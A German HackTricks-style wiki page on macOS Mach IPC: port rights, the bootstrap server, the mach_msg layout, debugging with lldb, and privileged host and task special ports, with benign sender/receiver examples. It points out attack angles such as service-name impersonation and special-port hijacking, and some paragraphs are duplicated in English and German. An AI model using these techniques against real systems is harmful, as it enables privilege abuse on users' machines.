# macOS IPC - Interprozesskommunikation

{{#include ../../../../banners/hacktricks-training.md}}

## Mach-Messaging über Ports

### Grundlegende Informationen

Mach verwendet **tasks** als die **kleinste Einheit** zur gemeinsamen Nutzung von Ressourcen, und jede task kann **mehrere threads** enthalten. Diese **tasks und threads sind 1:1 auf POSIX-Prozesse und -Threads abgebildet**.

Die Kommunikation zwischen tasks erfolgt über Mach Interprozesskommunikation (IPC) und nutzt unidirektionale Kommunikationskanäle. **Messages werden zwischen ports übertragen**, die vom Kernel verwaltete **Message-Queues** darstellen.

Ein **port** ist das **grundlegende** Element der Mach IPC. Er kann verwendet werden, um **Messages zu senden und zu empfangen**.

Jeder Prozess hat eine **IPC table**, in der man die **mach ports des Prozesses** finden kann. Der Name eines mach port ist tatsächlich eine Zahl (ein Pointer auf das Kernel-Objekt).

Ein Prozess kann außerdem einen Port-Namen mit gewissen Rechten **an eine andere task** senden und der Kernel wird diesen Eintrag in der **IPC table der anderen task** anlegen.

### Port-Rechte

Port-Rechte, die definieren, welche Operationen eine task ausführen kann, sind zentral für diese Kommunikation. Die möglichen **port rights** sind ([Definitions from here](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

- **Receive right**, die das Empfangen von Nachrichten, die an den Port gesendet werden, erlaubt. Mach ports sind MPSC (multiple-producer, single-consumer) Queues, was bedeutet, dass es im gesamten System höchstens **ein Receive right pro Port** geben kann (im Gegensatz zu pipes, wo mehrere Prozesse File-Deskriptoren für das Leseende derselben Pipe halten können).
- Eine **task mit dem Receive** right kann Nachrichten empfangen und **Send rights erzeugen**, wodurch sie Nachrichten senden kann. Ursprünglich hat nur die **eigene task das Receive right für ihren Port**.
- Wenn der Inhaber des Receive right **stirbt** oder es entfernt, wird das **Send right nutzlos (dead name)**.
- **Send right**, die das Senden von Nachrichten an den Port erlaubt.
- Das Send right kann **geklont** werden, sodass eine task, die ein Send right besitzt, dieses duplizieren und **einer dritten task gewähren** kann.
- Beachte, dass **port rights** auch **durch Mac messages weitergegeben** werden können.
- **Send-once right**, die das Senden einer einzelnen Nachricht an den Port erlaubt und dann verschwindet.
- Dieses Recht **kann nicht** geklont werden, aber es kann **verschoben** werden.
- **Port set right**, das eher ein _port set_ als einen einzelnen Port bezeichnet. Das Dequeuing einer Nachricht aus einem port set dequeuet eine Nachricht aus einem der Ports, die es enthält. Port sets können verwendet werden, um mehrere Ports gleichzeitig zu überwachen, ähnlich wie `select`/`poll`/`epoll`/`kqueue` in Unix.
- **Dead name**, das kein tatsächliches Port-Recht ist, sondern lediglich ein Platzhalter. Wenn ein Port zerstört wird, werden alle existierenden Port-Rechte auf diesen Port zu dead names.

**Tasks können SEND rights an andere übertragen**, wodurch diese Nachrichten zurücksenden können. **SEND rights können auch geklont werden, sodass eine task das Recht duplizieren und einer dritten task geben kann**. Dies ermöglicht zusammen mit einem Vermittlerprozess, bekannt als **bootstrap server**, effektive Kommunikation zwischen tasks.

### File Ports

File ports erlauben es, File-Deskriptoren in Mac ports zu kapseln (unter Verwendung von Mach port rights). Es ist möglich, aus einem gegebenen FD einen `fileport` mit `fileport_makeport` zu erstellen und aus einem fileport einen FD mit `fileport_makefd` zu erzeugen.

### Kommunikation aufbauen

Wie zuvor erwähnt, ist es möglich, Rechte mittels Mach messages zu senden, jedoch **kannst du kein Recht senden, ohne bereits ein Recht zu haben**, eine Mach-Nachricht zu senden. Wie wird also die erste Kommunikation hergestellt?

Hier kommt der **Bootstrap-Server** (**launchd** auf mac) ins Spiel: da **jeder ein SEND right zum Bootstrap-Server erhalten kann**, ist es möglich, diesen um ein Recht zu bitten, einer anderen task eine Nachricht zu senden:

1. Task **A** erstellt einen **neuen port** und erhält das **RECEIVE right** darauf.
2. Task **A**, als Inhaber des RECEIVE right, **erzeugt ein SEND right für den Port**.
3. Task **A** stellt eine **Verbindung** zum **Bootstrap-Server** her und **sendet ihm das SEND right** für den zuvor erzeugten Port.
- Denk daran, dass jeder ein SEND right zum Bootstrap-Server bekommen kann.
4. Task A sendet eine `bootstrap_register`-Nachricht an den Bootstrap-Server, um den gegebenen Port mit einem Namen wie `com.apple.taska` zu **assoziieren**.
5. Task **B** interagiert mit dem **Bootstrap-Server**, um einen Bootstrap-**lookup** für den Service-Namen auszuführen (`bootstrap_lookup`). Damit der Bootstrap-Server antworten kann, wird Task B ihm ein **SEND right zu einem zuvor erstellten Port** im Lookup-Message senden. Wenn der Lookup erfolgreich ist, **dupliziert der Server das von Task A erhaltene SEND right** und **überträgt es an Task B**.
- Denk daran, dass jeder ein SEND right zum Bootstrap-Server bekommen kann.
6. Mit diesem SEND right ist **Task B** in der Lage, eine **message** **an Task A** zu senden.
7. Für eine bidirektionale Kommunikation erzeugt üblicherweise Task **B** einen neuen Port mit einem **RECEIVE** right und einem **SEND** right und gibt **das SEND right an Task A**, so dass Task A Nachrichten an TASK B senden kann (bidirektionale Kommunikation).

Der Bootstrap-Server **kann den von einer task beanspruchten Service-Namen nicht authentifizieren**. Das bedeutet, eine **task** könnte potenziell **jede Systemtask impersonalisieren**, z. B. indem sie fälschlicherweise einen Autorisierungs-Service-Namen beansprucht und dann jede Anfrage akzeptiert.

Apple speichert die **Namen der systembereitgestellten Services** in sicheren Konfigurationsdateien, die sich in **SIP-geschützten** Verzeichnissen befinden: `/System/Library/LaunchDaemons` und `/System/Library/LaunchAgents`. Neben jedem Service-Namen wird auch die **zugehörige Binary gespeichert**. Der Bootstrap-Server wird ein **RECEIVE right für jeden dieser Service-Namen** erstellen und halten.

Für diese vordefinierten Services unterscheidet sich der **Lookup-Prozess leicht**. Wenn ein Service-Name angefragt wird, startet launchd den Service bei Bedarf dynamisch. Der neue Ablauf ist wie folgt:

- Task **B** initiiert einen Bootstrap-**Lookup** für einen Service-Namen.
- **launchd** prüft, ob die task läuft, und falls nicht, **startet** er sie.
- Task **A** (der Service) führt ein **bootstrap_check_in()** aus. Hier erstellt der **Bootstrap**-Server ein SEND right, behält es und **überträgt das RECEIVE right an Task A**.
- launchd dupliziert das **SEND right und sendet es an Task B**.
- Task **B** erzeugt einen neuen Port mit einem **RECEIVE** right und einem **SEND** right und gibt **das SEND right an Task A** (den Service), sodass dieser Nachrichten an TASK B senden kann (bidirektionale Kommunikation).

Dieser Prozess gilt jedoch nur für vordefinierte Systemtasks. Nicht-System-Tasks verhalten sich weiterhin wie ursprünglich beschrieben, was potenziell eine Impersonation ermöglichen könnte.

> [!CAUTION]
> Deshalb sollte launchd niemals abstürzen, sonst stürzt das gesamte System ab.

### Eine Mach-Nachricht

[Find more info here](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

Die Funktion `mach_msg`, im Wesentlichen ein Systemaufruf, wird zum Senden und Empfangen von Mach-Nachrichten verwendet. Die Funktion erwartet die zu sendende Nachricht als ersten Parameter. Diese Nachricht muss mit einer `mach_msg_header_t`-Struktur beginnen, gefolgt vom eigentlichen Nachrichteninhalt. Die Struktur ist wie folgt definiert:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Prozesse, die ein _**receive right**_ besitzen, können Nachrichten auf einem Mach-Port empfangen. Im Gegenzug erhalten die **senders** ein _**send**_ oder ein _**send-once right**_. Das send-once right dient ausschließlich zum Senden einer einzigen Nachricht; danach wird es ungültig.

Das Anfangsfeld **`msgh_bits`** ist eine Bitmap:

- Das erste Bit (höchstwertig) wird verwendet, um anzuzeigen, dass eine Nachricht komplex ist (mehr dazu unten)
- Das 3. und 4. Bit werden vom Kernel verwendet
- Die **5 niederwertigsten Bits des 2. Bytes** können für **voucher** verwendet werden: eine andere Art von Port, um Schlüssel/Wert-Kombinationen zu senden.
- Die **5 niederwertigsten Bits des 3. Bytes** können für den **local port** verwendet werden
- Die **5 niederwertigsten Bits des 4. Bytes** können für den **remote port** verwendet werden

Die Typen, die im voucher-, local- und remote-Port angegeben werden können, sind (aus [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
For example, `MACH_MSG_TYPE_MAKE_SEND_ONCE` can be used to **indicate** that a **send-once** **right** should be derived and transferred for this port. It can also be specified `MACH_PORT_NULL` to prevent the recipient to be able to reply.

Um beispielsweise `MACH_MSG_TYPE_MAKE_SEND_ONCE` zu verwenden, um **anzuzeigen**, dass ein **send-once** **right** für diesen Port abgeleitet und übertragen werden soll. Es kann auch `MACH_PORT_NULL` angegeben werden, um zu verhindern, dass der Empfänger antworten kann.

In order to achieve an easy **bi-directional communication** a process can specify a **mach port** in the mach **message header** called the _reply port_ (**`msgh_local_port`**) where the **receiver** of the message can **send a reply** to this message.

Um eine einfache **bidirektionale Kommunikation** zu erreichen, kann ein Prozess einen **mach port** im mach **message header** angeben, den sogenannten _reply port_ (**`msgh_local_port`**), an den der **Empfänger** der Nachricht eine **Antwort senden** kann.

> [!TIP]
> Note that this kind of bi-directional communication is used in XPC messages that expect a replay (`xpc_connection_send_message_with_reply` and `xpc_connection_send_message_with_reply_sync`). But **usually different ports are created** as explained previously to create the bi-directional communication.

> [!TIP]
> Beachte, dass diese Art der bidirektionalen Kommunikation in XPC-Nachrichten verwendet wird, die eine Antwort erwarten (`xpc_connection_send_message_with_reply` und `xpc_connection_send_message_with_reply_sync`). Meistens werden jedoch, wie zuvor erklärt, **unterschiedliche Ports erstellt**, um die bidirektionale Kommunikation herzustellen.

The other fields of the message header are:

- `msgh_size`: the size of the entire packet.
- `msgh_remote_port`: the port on which this message is sent.
- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html).
- `msgh_id`: the ID of this message, which is interpreted by the receiver.

Die anderen Felder des message header sind:

- `msgh_size`: die Größe des gesamten Pakets.
- `msgh_remote_port`: der Port, auf dem diese Nachricht gesendet wird.
- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html).
- `msgh_id`: die ID dieser Nachricht, die vom Empfänger interpretiert wird.

> [!CAUTION]
> Note that **mach messages are sent over a `mach port`**, which is a **single receiver**, **multiple sender** communication channel built into the mach kernel. **Multiple processes** can **send messages** to a mach port, but at any point only **a single process can read** from it.

> [!CAUTION]
> Beachte, dass **Mach-Nachrichten über einen `mach port` gesendet werden**, wobei es sich um einen Kommunikationskanal mit **einem einzigen Empfänger** und **mehreren Sendern** handelt, der im mach-Kernel implementiert ist. **Mehrere Prozesse** können **Nachrichten senden** an einen mach port, aber zu jedem Zeitpunkt kann nur **ein einziger Prozess lesen**.

Messages are then formed by the **`mach_msg_header_t`** header followed by the **body** and by the **trailer** (if any) and it can grant permission to reply to it. In these cases, the kernel just need to pass the message from one task to the other.

Nachrichten bestehen aus dem **`mach_msg_header_t`** Header, gefolgt vom **Body** und ggf. dem **Trailer**, und sie können die Erlaubnis zum Antworten gewähren. In diesen Fällen muss der Kernel die Nachricht nur von einer Task zur anderen weiterreichen.

A **trailer** is **information added to the message by the kernel** (cannot be set by the user) which can be requested in message reception with the flags `MACH_RCV_TRAILER_<trailer_opt>` (there is different information that can be requested).

Ein **Trailer** ist **vom Kernel zur Nachricht hinzugefügte Information** (kann nicht vom Benutzer gesetzt werden), die beim Empfang der Nachricht mit den Flags `MACH_RCV_TRAILER_<trailer_opt>` angefordert werden kann (es gibt unterschiedliche Informationen, die angefordert werden können).

#### Complex Messages

#### Complex Messages

However, there are other more **complex** messages, like the ones passing additional port rights or sharing memory, where the kernel also needs to send these objects to the recipient. In this cases the most significant bit of the header `msgh_bits` is set.

Es gibt jedoch auch andere, **komplexere** Nachrichten, wie solche, die zusätzliche Portrechte übergeben oder Speicher teilen, bei denen der Kernel diese Objekte ebenfalls an den Empfänger senden muss. In diesen Fällen wird das höchstwertige Bit des Headers `msgh_bits` gesetzt.

The possible descriptors to pass are defined in [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):

Die möglichen Deskriptoren, die übergeben werden können, sind definiert in [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
In 32-Bit-Systemen sind alle Deskriptoren 12B groß und der Deskriptor-Typ befindet sich im 11. Byte. In 64-Bit-Systemen variieren die Größen.

> [!CAUTION]
> Der kernel kopiert die Deskriptoren von einer Task zur anderen, erstellt dabei aber zuerst **eine Kopie im kernel-Speicher**. Diese Technik, bekannt als "Feng Shui", wurde in mehreren Exploits missbraucht, um den **kernel dazu zu bringen, Daten in seinem Speicher zu kopieren**, wodurch ein Prozess Deskriptoren an sich selbst senden konnte. Danach kann der Prozess die Nachrichten empfangen (der kernel wird sie freigeben).
>
> Es ist auch möglich, **Port-Rechte an einen verwundbaren Prozess zu senden**, und die Port-Rechte erscheinen einfach im Prozess (auch wenn dieser sie nicht handhabt).

### Mac Ports APIs

Beachte, dass Ports dem Task-Namespace zugeordnet sind. Um also einen Port zu erstellen oder zu suchen, wird auch der Task-Namespace abgefragt (mehr in `mach/mach_port.h`):

- **`mach_port_allocate` | `mach_port_construct`**: **Erstellt** einen Port.
- `mach_port_allocate` kann auch ein **port set** erstellen: ein RECEIVE-Recht über eine Gruppe von Ports. Immer wenn eine Nachricht empfangen wird, wird angegeben, von welchem Port sie stammt.
- `mach_port_allocate_name`: Ändert den Namen des Ports (standardmäßig 32-Bit-Ganzzahl)
- `mach_port_names`: Liefert Port-Namen von einem Ziel
- `mach_port_type`: Liefert die Rechte eines Tasks über einen Namen
- `mach_port_rename`: Benennt einen Port um (wie dup2 für FDs)
- `mach_port_allocate`: Allokiert ein neues RECEIVE, PORT_SET oder DEAD_NAME
- `mach_port_insert_right`: Erstellt ein neues Recht in einem Port, in dem man RECEIVE besitzt
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: Funktionen, die verwendet werden, um **mach messages zu senden und zu empfangen**. Die overwrite-Version erlaubt es, einen anderen Puffer für den Empfang anzugeben (die andere Version verwendet einfach denselben wieder).

### Debug mach_msg

Da die Funktionen **`mach_msg`** und **`mach_msg_overwrite`** zum Senden und Empfangen von Nachrichten verwendet werden, erlaubt ein Breakpoint auf ihnen, die gesendeten und empfangenen Nachrichten zu inspizieren.

Zum Beispiel: starte das Debugging einer beliebigen Anwendung, die du debuggen kannst — sie wird **`libSystem.B` laden, das diese Funktion verwendet**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 <+0>:  pacibsp
0x181d3ac24 <+4>:  sub    sp, sp, #0x20
0x181d3ac28 <+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c <+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&) const::$_0::operator()() const + 168
</code></pre>

Um die Argumente von **`mach_msg`** zu erhalten, überprüfe die Register. Dies sind die Argumente (aus [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Werte aus den Registries abrufen:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
Untersuche den Nachrichten-Header, indem du das erste Argument prüfst:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
Diese Art von `mach_msg_bits_t` ist sehr verbreitet, um eine Antwort zu ermöglichen.

### Ports auflisten
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
Der **Name** ist der Standardname, der dem Port zugewiesen wird (beachte, wie er in den ersten 3 Bytes **ansteigt**). Der **`ipc-object`** ist der **obfuskierte** eindeutige **Identifikator** des Ports.\
Beachte auch, wie Ports mit nur dem **`send`**-Recht den **Eigentümer** davon identifizieren (Portname + pid).\
Beachte außerdem die Verwendung von **`+`**, um **andere Tasks, die mit demselben Port verbunden sind**, anzuzeigen.

Es ist auch möglich, [**procesxp**](https://www.newosxbook.com/tools/procexp.html) zu verwenden, um ebenfalls die **registrierten Service-Namen** zu sehen (mit deaktiviertem SIP aufgrund der Notwendigkeit von `com.apple.system-task-port`):
```
procesp 1 ports
```
Du kannst dieses Tool unter iOS installieren, indem du es von [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz) herunterlädst

### Code-Beispiel

Beachte, wie der **sender** einen Port **allocates**, ein **send right** für den Namen `org.darlinghq.example` erstellt und an den **bootstrap server** sendet, während der **sender** das **send right** dieses Namens anforderte und es benutzte, um eine **send a message**.

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

## Privilegierte Ports

Es gibt einige spezielle Ports, die es erlauben, bestimmte sensible Aktionen auszuführen oder auf bestimmte sensible Daten zuzugreifen, falls ein Task die **SEND**-Berechtigung für sie hat. Das macht diese Ports aus Angreiferperspektive sehr interessant — nicht nur wegen der Möglichkeiten, sondern auch weil es möglich ist, **SEND**-Berechtigungen zwischen Tasks zu teilen.

### Host-Spezialports

Diese Ports werden durch eine Nummer repräsentiert.

**SEND**-Rechte können durch Aufruf von **`host_get_special_port`** erhalten werden und **RECEIVE**-Rechte durch Aufruf von **`host_set_special_port`**. Beide Aufrufe benötigen jedoch den **`host_priv`**-Port, auf den nur root zugreifen kann. Außerdem konnte root früher **`host_set_special_port`** aufrufen und beliebige Ports hijacken, was z. B. das Umgehen von Code-Signaturen ermöglichte, indem `HOST_KEXTD_PORT` übernommen wurde (SIP verhindert das inzwischen).

Diese sind in zwei Gruppen unterteilt: Die **ersten 7 Ports gehören dem Kernel** — dabei sind 1 `HOST_PORT`, 2 `HOST_PRIV_PORT`, 3 `HOST_IO_MASTER_PORT` und 7 `HOST_MAX_SPECIAL_KERNEL_PORT`.\
Die ab der Nummer **8** beginnenden Ports **gehören system daemons** und sind in [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html) deklariert.

- **Host port**: Wenn ein Prozess die **SEND**-Berechtigung für diesen Port hat, kann er **Informationen** über das **System** erhalten, indem er dessen Routinen aufruft, z. B.:
- `host_processor_info`: Get processor info
- `host_info`: Get host info
- `host_virtual_physical_table_info`: Virtual/Physical page table (requires MACH_VMDEBUG)
- `host_statistics`: Get host statistics
- `mach_memory_info`: Get kernel memory layout
- **Host Priv port**: Ein Prozess mit **SEND**-Recht auf diesen Port kann **privilegierte Aktionen** durchführen, z. B. Boot-Daten anzeigen oder versuchen, eine kernel extension zu laden. Der **Prozess muss root sein**, um diese Berechtigung zu erhalten.
- Außerdem benötigt man, um die API **`kext_request`** aufzurufen, zusätzliche Entitlements **`com.apple.private.kext*`**, die nur Apple-Binaries erhalten.
- Weitere Routinen, die aufgerufen werden können, sind:
- `host_get_boot_info`: Get `machine_boot_info()`
- `host_priv_statistics`: Get privileged statistics
- `vm_allocate_cpm`: Allocate Contiguous Physical Memory
- `host_processors`: Send right to host processors
- `mach_vm_wire`: Make memory resident
- Da **root** auf diese Berechtigung zugreifen kann, könnte es `host_set_[special/exception]_port[s]` aufrufen, um host special oder exception ports zu hijacken.

Es ist möglich, **alle Host-Spezialports zu sehen**, indem man folgendes ausführt:
```bash
procexp all ports | grep "HSP"
```
### Task-Spezialports

Dies sind Ports, die für wohlbekannte Dienste reserviert sind. Sie lassen sich durch Aufruf von `task_[get/set]_special_port` abrufen/setzen. Sie sind in `task_special_ports.h` zu finden:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
From [here](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html):

- **TASK_KERNEL_PORT**\[task-self send right]: Der Port, der zur Steuerung dieses Tasks verwendet wird. Dient dazu, Nachrichten zu senden, die den Task beeinflussen. Dies ist der Port, der von **mach_task_self (see Task Ports below)** zurückgegeben wird.
- **TASK_BOOTSTRAP_PORT**\[bootstrap send right]: Der Bootstrap-Port des Tasks. Wird verwendet, um Nachrichten zu senden, die die Rückgabe anderer Systemdienst-Ports anfordern.
- **TASK_HOST_NAME_PORT**\[host-self send right]: Der Port, der verwendet wird, um Informationen über den enthaltenen Host anzufordern. Dies ist der Port, der von **mach_host_self** zurückgegeben wird.
- **TASK_WIRED_LEDGER_PORT**\[ledger send right]: Der Port, der die Quelle benennt, aus der dieser Task seinen wired Kernel-Speicher bezieht.
- **TASK_PAGED_LEDGER_PORT**\[ledger send right]: Der Port, der die Quelle benennt, aus der dieser Task seinen standardmäßig verwalteten Speicher bezieht.

### Task-Ports

